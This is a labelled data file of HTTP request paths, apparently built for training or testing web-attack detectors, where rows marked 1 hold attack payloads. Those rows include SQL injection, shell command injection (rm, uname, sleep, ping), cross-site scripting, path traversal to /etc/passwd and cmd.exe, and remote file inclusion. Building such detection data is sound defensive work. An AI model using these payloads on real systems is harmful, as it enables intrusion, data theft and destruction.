request	label
"/ help . php ? q =  ""  ; rm \ x09q65733963 \ x09 # "	1
/ magicthegatheringbattlegroundsv1 / 	0
/ fbillepisode31 / 	0
/ enterprojectnum / 	0
/ 000091716 / 	0
/ 000057491 / 	0
/ ie777 . exe / 	1
/ string / strings / parameters = 9173064367648056 	0
/ string / strings / parameters = '  |   [  9 -ne  $  ( echo rdjfgw  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  & 	1
/ string / strings / parameters = comiso 	0
/ string / strings / parameters = 1 )  and  ( select  *  from  ( select ( sleep ( 5 )  )  ) gcrr )  # 	1
/ string / strings / parameters = huari 	0
/ 147936 / 	0
/ javascript /  ~ dan . doc 	0
/ 812522 / 	0
/ string / strings / parameters = echo apyflp $  (  ( 24 + 89 )  )  $  ( echo apyflp ) apyflp /  / 	1
/ digicam / 	0
"/ string / strings / parameters = ""  & echo tgsmri $  (  ( 56 + 34 )  )  $  ( echo tgsmri ) tgsmri \  \ "	1
/ string / strings / parameters = 69671861p 	0
/ string / strings / parameters = 12188295c 	0
"/ top . php ? stuff =  "" ping \ xa0-w \ xa07000 \ xa0-n \ xa01 \ xa04 . 3 . 2 . 1 & rem \ xa0 "	1
/ string / strings / parameters = 1 '  )  )  and exp (  ~  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 8190 = 8190 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) x )  )  and  (  (  ' kqqf '  =  ' kqqf 	1
/ string / strings / parameters = 7730856749924883 	0
/ string / modo = registro & login = kinamon & password = paleteo & nombre = sia & apellidos = banda + garitacelaya & email = stadler_munks @ chevrolet-volt . at & dni = 81878772z & direccion = calle + regina + 18 ,  +  & ciudad = molinos ,  + los & cp = 46838 & provincia = asturias & ntc = 2756434329152004 & b1 = registrar 	0
/ scripts / spt -- forumtopics . php ? forumid = -9 union select null , null , null , 1331908887 , 4 , 5 	1
/ finepix_a600 / 	0
/ string / strings / parameters = 10260 	0
/ string / strings / parameters = >  < marquee / onstart = confirm (  / xss /  . source )  ; confirm ( 1 )  > 	1
"/ string / strings / parameters = < script src =  ""  /  / brutelogic . com . br & sol ; 1 . js & num ; "	1
/ ht8pn8uq . mscgi ?  < script > cross_site_scripting . nasl <  / script > 	1
/ javascript / hide . rhtml 	0
/ cherokee_ben / 	0
/ string / id = 1 & nombre = vino + rioja & precio = 85 & cantidad = 85 & b1 = aadir + al + carrito 	0
/ sl-3200 / 	0
/ level1_yes / 	0
/ string / strings / parameters = 1 '  )  )  )  and row ( 6237 , 7469 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 6237 = 6237 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and  (  (  (  ' ejul '  =  ' ejul 	1
/ music_plasma / 	0
/ string / strings / parameters = intuitivo 	0
/ string / strings / parameters = roana 	0
/ ns4905820108 / 	0
/ javascript / access . lst 	0
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo xdaibc )   &  &  str1 =  $  {  # str }   &  &   [  7 -eq  $  { str1 }   ]   &  &  sleep 1  | 	1
/ string / strings / parameters = | echo $ ifszffapm $  (  ( 39 + 91 )  )  $  ( echo $ ifszffapm ) zffapm ' 	1
/ 297650 / 	0
/ 000023204 / 	0
/ block-line2 / 	0
/ carolyn kepcher / 	0
"/ string / strings / parameters = ""  ""  +  { valueof : alert } "	1
/ string / id = 3 & nombre = jamn + ibrico & precio = 39 & cantidad = 18 & b1 = aadir + al + carrito 	0
/ string / strings / parameters = 1 and make_set ( 8403 = 8403 , 8899 )  #  zysq 	1
/ string / strings / parameters = 1 '  and 3707 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  and  ' bxjo '  like  ' bxjo 	1
/ sk_rozne / 	0
/ javascript / q4 . tmp 	0
/ javascript / funcs . exe 	1
/ 181280 / 	0
/ xoops232b / htdocs / xoops_lib / modules / protector / onupdate . php ? mydirname = a (  )  {  } system (  ' chmod + 555 +  / tmp / sdlffngmto0 ;  '  )  ;  function v 	1
/ georgeclooneylakecomo / 	0
/ r3le3om5 . nsf ?  < script > cross_site_scripting . nasl <  / script > 	1
/ useourquotes / 	0
/ legreport2006 / 	0
/ javascript / foundation . orig 	0
/ string / strings / parameters = -6108 '  )  union all select 2519 , 2519 , 2519 , 2519 -- 	1
"/ top . php ? stuff =  "" ping \ x0b-w \ x0b8000 \ x0b-n \ x0b1 \ x0b4 . 3 . 2 . 1 & rem \ x0b "	1
"/ string / strings / parameters = 1 ""  ""  )  and 4241 = convert ( int ,  ( select char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  and  (  ""  "" hbfr ""  ""  like  ""  "" hbfr "	1
/ string / strings / parameters = -1 <  < script > document . cookie = true ;  <  / script > 	1
/ string / strings / parameters = quintiliana 	0
/ 000025232 / 	0
/ string / strings / parameters = < form >  < button formaction = javascript & colon ; alert ( 1 )  > clickme 	1
/ pascal ' s_wager / 	1
/ qimage_v2005 / 	0
/ string / strings / parameters = 1 '  +  ( select  ' ixvd '  where 4772 = 4772 and char ( 111 )  |  | char ( 77 )  |  | char ( 121 )  |  | char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  )  +  ' 	1
/ danpropper032206 / 	0
/ 2006112770044wcpi1 / 	0
/ string / modo = registro & login = jovo & password =  /  ' ttrico & nombre = hebelen & apellidos = fornalino + grimaldi & email = ozaki_wanamaker @ travelzone . tel & dni = 75981771y & direccion = calle + san + juan + bautista + de + la + salle + 193 + 6 ? c & ciudad = calatorao & cp = 10191 & provincia = burgos & ntc = 3393638948319901 & b1 = registrar 	1
/ 61673625 / 	0
/ carmanah / 	0
/ string / strings / parameters = -5728 )  where 8663 = 8663 union all select 8663 , 8663 , 8663 , 8663 , 8663 , 8663 , 8663 , 8663 , 8663 , 8663 # 	1
/ string / strings / parameters = & echo $ ifsuhfghj $  (  ( 52 + 93 )  )  $  ( echo $ ifsuhfghj ) uhfghj ' 	1
/ string / strings / parameters = 1 '  where 8430 = 8430 or 7417 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  -- 	1
/ associated-staffing / 	0
/ manager / htsearch ? exclude =  `  / etc / passwd ` 	1
"/ awstats / awstats . pl ? migrate =  | echo ;  / bin / echo -en  ""  \ 0367 \ 0322 \ 0041 \ 03201 \ 0311qqj \ 0042j \ 0007pq \ 0211 \ 0343 ""   >  >   / tmp / urcppbumwm0 ; echo | awstats528110 . txt "	1
/ string / strings / parameters = 4658 	0
"/ string / strings / parameters = < div id =  "" 124 ""  >  < script src =  ""  /  \ example . com \ foo . js ""  >  <  / script >   /  /  safari 5 . 0 ,  chrome 9 ,  10 "	1
/ cgi-local / cgiemail-1 . 6 / cgicso ? query =  < script > alert (  ' vulnerable '  )  <  / script > 	1
/ help . php ? q =  ; uname \ x09 > q36511176 \ x09 # 	1
/ string / strings / parameters = ( select 1 from generate_series ( 9352 , 9352 , case when  ( 9352 = 9352 )  then 1 else 0 end )  limit 1 ) 	1
/ string / strings / parameters = 34192 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo forfuz )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  ' 	1
/ string / strings / parameters = 0496158701394687 	0
/ scripts / phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331919143 & lang_crm =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / boot . ini \ x00 	1
/ string / modo = registro & login = pepple & password = endelgadecer & nombre = nir +  ? m-ana & apellidos = antolnez + tamallangos & email = hassall @ 007tv . nf & dni = 80856285s & direccion = c /  + capitanes + ripoll ,  + 68 ,  + 9-g & ciudad = pajaroncillo & cp = 01120 & provincia = madrid & ntc = 3246974816793870 & b1 = registrar 	1
/ string / b2 = vaciar + carrito ? 	1
/ 3111721 / 	0
/ quickssl_anim / 	0
/ string / strings / parameters = mola guell 	0
/ string / strings / parameters = 1 '  )  )  as dqdv where 8126 = 8126 and 4595 = 4595 # 	1
/ string / strings / parameters = 41910864b 	0
/ string / modo = registro & login = eppe / r / s * on & password = pisa-verde & nombre = vianella & apellidos = galdeano + piccech & email = dudgeon @ tradora . na & dni = 80818838n & direccion = c /  + can + petit + 42 ,  + 10-f & ciudad = gormaz & cp = 32737 & provincia = zaragoza & ntc = 0673547824413217 & b1 = registrar 	1
/ image . php ? url = http :  /  / 192 . 168 . 202 . 96 : 8080 / txenjrxf3 ?  ?  ?  ? 	0
/ javascript / this . o 	0
"/ search . jsp ? q =  %  ""  < script > alert ( 1331904190 )  <  / script > "	1
/ examples / jsp / error / yabb . pl ? board = news & action = display & num =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
"/ s7qus4g3 . do ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ soccer_w0qqfromzr4qqsacatz20862qqsocmdzlistingitemlistqqsspagenamezdcpsporttextnonfeat / 	0
/ string / strings / parameters = deolinda 	0
/ 152513 / 	0
/ developing decision-making skills for business / 	0
/ protest / 	0
/ javascript / print . msg 	0
/ javascript / tar . bz2 . exe 	1
/ cache-162x243 / 	0
/ string / strings / parameters = 49540 	0
/ construction safety association / 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo ifmaps )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  ' 	1
/ index . asp ? fid = 412585577799 ' error 	1
/ string / strings / parameters = 03440 	0
/ cgi-bin / styles . php ? toroot =  / etc / passwd \ x00 	1
/ string / strings / parameters = 21208 	0
/ wp-email / 	0
/ string / modo = registro & login = kangning & password = 635l82rab74id35 & nombre = alexsandra & apellidos = basset + ramos & email = campanini-adamson @ barebackspain . kh & dni = 39509298j & direccion = travesia + san + lazaro ,  + 86 +  & ciudad = cabaas + del + castillo & cp = 09471 & provincia = burgos & ntc = 9584356702291868 & b1 = registrar 	0
/ script / _conf / core / common-tpl-vars . php ? confdir =  @ rfiurl ? confdir =  @ rfiurl ? 	1
/ string / strings / parameters = 0577598147350952 	0
/ t13140 / 	0
/ top . php ? stuff =  '  ; sleep \ x097 \ x09 # 	1
/ scripts / crystalimagehandler . aspx ? dynamicimage =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / winnt / system . ini 	1
/ hp_integrityessentialswp / 	0
/ string / str =  $  ( echo qofxcy )   str1 =  $  {  # str }   if  [  7 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  & 	1
/ javascript / request . exe 	1
"/ string / strings / parameters = 1 ""  ""  )  )  )  and make_set ( 7809 = 9564 , 9564 )  and  (  (  (  ""  "" jggk ""  ""  like  ""  "" jggk "	1
/ mobility-wireless / 	0
"/ string / strings / parameters = ""  | echo xtlldx $  (  ( 25 + 20 )  )  $  ( echo xtlldx ) xtlldx \ "	1
/ manager / evb / check_url . php ? url = pligg_url_sql_injection . nasl '  union select 1331904454 , 472430861  -- 	1
"/ string / strings / parameters = & echo $ ifsakvcnq $  (  ( 27 + 21 )  )  $  ( echo $ ifsakvcnq ) akvcnq "" "	1
/ firewire-interconnects / 	0
/ string / strings / parameters = claros lafragueta 	0
/ string / strings / parameters = 98458242a 	0
/ msg333140 / 	0
/ string / id = any  set-cookie :  + tamper = 5765205567234876235 	1
/ 1166108000_14 / 	0
/ string / strings / parameters = plaza esquivias ,  68 ,  5 ? g 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo tabxyh )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1 	1
/ string / strings / parameters = chmara @ novolardiseno . ky 	0
/ javascript / decryption . dat 	0
/ string / strings / parameters = &  & echo $ ifssujvlb $  (  ( 59 + 86 )  )  $  ( echo $ ifssujvlb ) sujvlb | 	1
/ javascript / microsoft . fcgi 	0
"/ en-us / odzk29aa . do ?  < script > document . cookie =  "" testtfvh = 2141 ;  ""  <  / script > "	1
/ string / modo = insertar & precio = 4613 & b1 = confirmar | 	1
/ top . php ? stuff =  '  & rm \ x09q46445966 \ x09 # 	1
/ string / modo = insertar & precio = 4887 & b1 = pasar + por + caja 	0
/ string / strings / parameters = '   str =  $  ( echo jzojbe )   str1 =  $  {  # str }   if  [  2 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  /  / 	1
/ string / strings / parameters = '   str =  $  ( echo wudxts )   str1 =  $  {  # str }   if  [  8 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  & 	1
/ dir_thatware / config . php ? root_path = http :  /  / 192 . 168 . 202 . 96 : 8080 / txenjrxf3 ?  ' 	1
/ includes / bbcb_mg . php ? phpbb_root_path = xxpathxx ? 	1
/ string / modo = entrar & login = shemwell & pwd = loamiento & remember = on & b1 = entrar 	0
"/ string / strings / parameters = < a href =  "" javascript \ x3ajavascript : alert ( 1 )  ""  id =  "" fuzzelement1 ""  > test <  / a > "	1
/ string / modoa = registro & login = matsuzak & password = de82ggic8 & nombre = hayde & apellidos = arrotcharen + doniz & email = kontou @ 15horas . wf & dni = 06384093y & direccion = calle + crucero-bouzas ,  + 185 ,  +  & ciudad = leaburu & cp = 32730 & provincia = teruel & ntc = 0473794196460600 & b1 = registrar 	1
/ string / strings / parameters = lippe-bubat4 @ tradora . va 	0
/ rpc /  .  .  \ xc0 \ xaf .  .  \ xc0 \ xaf .  .  \ xc0 \ xaf .  .  \ xc0 \ xaf .  .  \ xc0 \ xaf .  .  / winnt / system32 / cmd . exe ?  / c + dir + c :  \  +  / og 	1
/ string / strings / parameters = 1 '  |  |  ( select  ' baur '  from dual where 9384 = 9384 or char ( 119 )  |  | char ( 100 )  |  | char ( 99 )  |  | char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 )  , 0 )  , 5000000000 )  , null )  -- 	1
/ 3088514 / 	0
/ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  { file } 	1
"/ string / strings / parameters = ""  >  < script >  "" "	1
/ freecatalogue / 	0
/ lifestyleconsulting / 	0
/ string / id = 2 & nombre = vino + rioja & precio = 85 & cantidad = 23 ?  & b1 = aadir + al + carrito 	1
/ examples / jsp / colors / index . php ? chemin =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / etc 	1
/ string / strings / parameters = 1 '  )  )  or 4411 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  and  (  (  ' holo '  =  ' holo 	1
/ top . php ? stuff =  '  \ x0adel \ x09q14875513 \ x09 # 	1
/ buzz_maze2 / 	0
/ string / modo = entrar & login = beasley & pwd = narcisismo & remember = off /  & b1 = entrar 	1
/ deanswelcome / 	0
/ string / strings / parameters = -2102 '  where 3644 = 3644 or 5023 = ctxsys . drithsx . sn ( 5023 ,  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  -- 	1
/ string / strings / parameters = 1 '  |  |  ( select  ' ltqo '  where 9080 = 9080 and 3202 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  )  |  |  ' 	1
"/ string / modo = entrar & login = levis & pwd = 8scualide6 & remember = off & b1 =  < script > alert (  "" paros ""  )  ;  <  / script > "	1
/ let them eat pussy / 	0
/ svg-tutorial / 	0
/ 144934 / 	0
/ javacomm / 	0
/ string / modo = insertar & precio = 9567 & b1 = confirmar / 	1
/ includes / ajax_listado . php ? urlmodulo = xxpathxx 	1
/ 43926562_50b10641df / 	0
/ openemr / interface / login / validateuser . php ? u = test ' 	1
"/ yef5f3d5 . aspx ?  < meta http-equiv = set-cookie content =  "" testcrcv = 6167 ""  > "	1
/ console / faces / com_sun_web_ui / help / helpwindow . jsp ? windowtitle =  <  / title >  < script > alert (  ' sun_java_web_console_helpwindow_xss . nasl '  )  <  / script > 	1
/ retroreview / 	0
/ string / strings / parameters = alcarrs 	0
/ iphone-bingo / 	0
/ htbin / nimages . php 	0
/ javascript / file . java 	0
/ javascript / deny . properties 	0
/ javascript / warez . msg 	0
/ string / strings / parameters = ' 1 	1
/ suggest / 	0
/ string / modo = insertar & precio = 6019 & b1 = pasar + por + caja 	0
/ neotrace_small / 	0
/ examples / jsp / cal / pjreview_neo . cgi ? p =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / strings / parameters = 1 '  +  ( select myci where 8903 = 8903 ; create or replace function sleep ( int )  returns int as  '  / lib / libc . so . 6 '  ,  ' sleep '  language  ' c '  strict ;  select sleep ( 5 )  -- 	1
/ cacti / evb / check_url . php ? url = pligg_url_sql_injection . nasl '  union select 1331905213 , 113095511  -- 	1
/ string / strings / parameters = 1 '  )  rlike  ( select  ( case when  ( 2721 = 8716 )  then 1 else 0x28 end )  )  and  (  ' dumt '  =  ' dumt 	1
/ javascript / webchat . csproj 	0
/ string / strings / parameters = ;  str =  $  ( echo oiphjr )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  & 	1
"/ g3w7y7u5 . dll ?  < script > document . cookie =  "" testbfpq = 3326 ;  ""  <  / script > "	1
/ string / modo = registro & login = babatund & password = pa6omer9-a & nombre = juana + del + pilar & apellidos = luna + barberan & emaila = mazurowna @ wdsl . om & dni = 19546963e & direccion = villadangos + del + paramo ,  + 82 ,  +  & ciudad = encinas + de + esgueva & cp = 10830 & provincia = alicante & ntc = 5365738910346806 & b1 = registrar 	1
/ examples / jsp / jsp2 / jspx / includes / config . php ? relative_script_path = http :  /  / xxxxxxx 	1
/ forum1 / 	0
/ bethesda_map / 	0
/ string / modo = registro & login = toulson & password = 79p2lis25 & nombre = maila & apellidos = ciezar & email = dafydd @ mytanga . nf & dni = 41724359j & direccion = c /  + santa + clara + 126 ,  + 6 ? e & ciudad = onzonilla & cp = 19461 & provincia = ourense & ntc = 1957012493079149 & b1 = registrar 	0
/ main . php ? frm_daynight = day & frm_passwd =  & frm_referer = http :  /  / 192 . 168 . 23 . 202 / main . php ? logout = 1 & frm_user =  & scr_height = q58671721 & scr_width = 	1
/ c83_f107 / 	0
/ javascript / document . pfx 	1
"/ string / strings / parameters = -3707 ""  ""  )  )  )  or 8571 = 8571 -- "	1
"/ string / strings / parameters = < a href =  ""  "" http :  /  / server . com /  ""  ""  > crosssitescripting <  / a > "	1
/ aarnetlogo / 	0
/ string / strings / parameters = 1 '  )  )  )  and 2542 = 7042 -- 	1
"/ main . php ? logout =  "" rm \ x0bq12574322 & rem \ x0b "	1
/ javascript / signed . png 	0
/ string / strings / parameters = '  ) print (  ` echo eswacn ; echo  $  (  ( 37 + 82 )  )  ; echo eswacn ; echo eswacn `  )  ; eswacn 	1
/ string / strings / parameters = 1 '  )  or 8514 = benchmark ( 5000000 , md5 ( 0x544d5a4c )  )  # 	1
/ string / strings / parameters = c /  severo ochoa ,  133 13 ? c 	0
/ 1879433867 / 	0
/ string / id = 1 & nombre = jamn + ibrico & precio = 39 & cantidad = 57 & b1 = aadir + al + carrito 	0
/ coverpromo2 / 	0
/ string / strings / parameters = sotorro feo 	0
/ javascript / priv . so 	0
/ string / strings / parameters = ftp :  /  / 192 . 168 . 21 . 103 /  *  < apache_mod_proxy_ftp_glob_xss . nasl > 	1
/ string / modo = registro & login = wierzba & password = en62rm30a & nombre = adelfo & apellidos = mundaca + gmez & email = gor @ mley @ apicultor . kz & dni = 78942434v & direccion = periodista + jose + fernandez + martinez ,  + 156 + 5 ? b & ciudad = navaconcejo & cp = 44592 & provincia = madrid & ntc = 0883153406920438 & b1 = registrar 	1
/ string / strings / parameters = laguna del marquesado 	0
/ string / strings / parameters = order by 12 	1
/ wracing2 / 	0
/ string / id = 1 & nombre = queso + manchego & precio = 39 & cantidad = 96 & b1 = aadir + al + carrito 	0
"/ main . php ? logout =  ""  ; uname  # "	1
/ 180071 / 	0
/ infosurge / 	0
/ trojlineageab / 	0
/ string / strings / parameters = |   [  8 -ne  $  ( echo parklw  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  / 	1
"/ string / strings / parameters = ""  ;  str =  $  ( echo usunjp )  ;  str1 =  $  {  # str }  ;  if  [  2 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  | "	1
/ beautifier / core . php ? beaut_path = xxpathxx ? 	1
"/ string / strings / parameters = | echo $ ifsolrtpj $  (  ( 84 + 81 )  )  $  ( echo $ ifsolrtpj ) olrtpj "" "	1
/ plume-1 . 1 . 3 / manager / tools / link / dbinstall . php ? cmd = ls & _px_config [ manager_path ]  = xxpathxx 	1
/ string / strings / parameters = 18128 	0
/ string / modo = registro & login = dougall & password = bisonte & nombre = olalia & apellidos = molas + madan & email = landesman @ cohel . mw & dni = 95690740e & direccion = sargento + luna ,  + 184 +  & ciudad = villagalijo & cp = 22571 & provincia = girona & ntc = 9687551942893066 & b1 = registrar 	0
"/ u95h6ymu . cfm ?  < meta http-equiv = set-cookie content =  "" testkhwc = 4028 ""  > "	1
/ examples / jsp / checkbox / index . php ? id = 0rop9yeuxw ' 	1
"/ string / strings / parameters = & echo joadau $  (  ( 32 + 46 )  )  $  ( echo joadau ) joadau "" "	1
"/ search . jsp ? q =  %  ""  < script > alert ( 1331904189 )  <  / script > "	1
/ jeremic-djordje / 	0
/ string / strings / parameters = 1 '  +  ( select naiw where 4924 = 4924 ; select case when 5346 = 8272 then 1 else null end -- 	1
/ javascript / office . exe 	1
/ run . php ? dir = shell ?  & file = xxpathxx 	1
/ rassled2 / 	0
/ string / strings / parameters = raimund 	0
/ counter_measures / 	0
/ string / strings / parameters = -7350 '  )  )  )  union all select 9207 , 9207 , 9207 , 9207 -- 	1
/ string / strings / parameters = xtiva 	0
/ screenshopcapture / 	0
/ examples / jsp / jsp2 / el / includes / config . php ? relative_script_path = http :  /  / xxxxxxx 	1
/ javascript / 1000 . test 	0
"/ string / strings / parameters = < base href =  ""  "" javascript : alert (  ' crosssitescripting '  )  ;  /  /  ""  ""  > "	1
/ informe / 	0
"/ string / strings / parameters = 1 %  ""  ""  )  )  )  ; select dbms_pipe . receive_message ( chr ( 112 )  |  | chr ( 70 )  |  | chr ( 106 )  |  | chr ( 78 )  , 5 )  from dual -- "	1
/ string / strings / parameters = macdowal 	0
/ javascript / ssl . bat 	0
"/ main . php ? logout =  "" del q44662571  # "	1
/ b1q8bywu . jsp ?  < script > cross_site_scripting . nasl <  / script > 	1
/ mimg-6tfsak / 	0
/ javascript / device . tar 	0
/ en-us / account / admin / components / com_fm / fm . install . php ? lm_absolute_path =  .  .  /  .  .  /  .  .  /  & install_dir = limbo_com_fm_php_shell . nasl-1331909349 	1
/ auug2005 / 	0
/ siam_gifts / 	0
/ string / strings / parameters = | echo dhcfmd $  (  ( 19 + 7 )  )  $  ( echo dhcfmd ) dhcfmd 	1
"/ string / strings / parameters = '  | echo $ ifsqddmwf $  (  ( 38 + 22 )  )  $  ( echo $ ifsqddmwf ) qddmwf "" "	1
/ q23989858 	0
/ string / strings / parameters = 7964371897239814 	0
/ investigations / 	0
/ 1573304484 / 	0
/ deans_message / 	0
/ string / strings / parameters = 25186 	0
/ bridge / yabbse . inc . php ? sourcedir = xxpathxx 	1
/ string / strings / parameters = |   [  2 -ne  $  ( echo parklw  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  / 	1
/ string / strings / parameters = 35141479d 	0
/ string / strings / parameters = bendex @ xavipetit . it 	0
/ string / strings / parameters = reilly-pidgeon @ interpretacion-diccionario-y-significado-de-los-s 	0
/ sigurg / 	0
/ javascript / excalibur . orig 	0
/ javascript / sox . old 	0
/ lib / classes / swift / mime / parameterizedheader . php . 1 	0
/ string / modo = entrar & login = nolie & pwd = nort $ ea & remember = on & b1 = entrar 	0
/ seanjohn / 	0
"/ bmeun223 . htm ?  < meta http-equiv = set-cookie content =  "" testhhwu = 7044 ""  > "	1
"/ string / strings / parameters = ""  &  sleep 0  &  &  str =  $  ( echo ewgaea )   &  &  str1 =  $  {  # str }   &  &   [  7 -eq  $  { str1 }   ]   &  &  sleep 1  & "	1
/ string / strings / parameters = 58193627q 	0
/ string / modo = entrar & login = davin ' der & pwd = engreado & remember = off & b1 = entrar 	1
/ javascript / default . exe 	1
/ javascript / credit . tpl 	0
/ javascript / proxy . lst 	0
/ main . php ? frm_daynight = day & frm_passwd =  & frm_referer = http :  /  / 192 . 168 . 24 . 202 / main . php ? logout = 1 & frm_user = q66642634 & scr_height =  & scr_width = 	1
/ string / strings / parameters = standfor 	0
/ pick_012000 / 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo matzok )   &  &  str1 =  $  {  # str }   &  &   [  3 -eq  $  { str1 }   ]   &  &  sleep 1  /  / 	1
